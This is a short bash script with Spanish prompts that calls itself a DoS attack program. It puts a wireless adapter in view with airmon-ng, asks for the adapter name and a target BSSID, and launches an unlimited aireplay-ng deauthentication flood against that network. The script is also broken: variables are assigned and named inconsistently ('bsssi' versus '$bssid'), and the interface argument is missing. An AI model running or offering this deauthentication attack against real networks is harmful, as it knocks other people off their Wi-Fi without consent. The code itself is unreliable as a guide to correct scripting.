echo "Bienvenido a mi Programa de ataque Dos ahora vamos a escanear red"

echo "inserta tu adaptador"

sudo airmon-ng

x= echo "pon el nombre de tu adaptador "
read x



bsssi= echo "pon el bssid de la red"

aireplay-ng -0 0 -b $bssid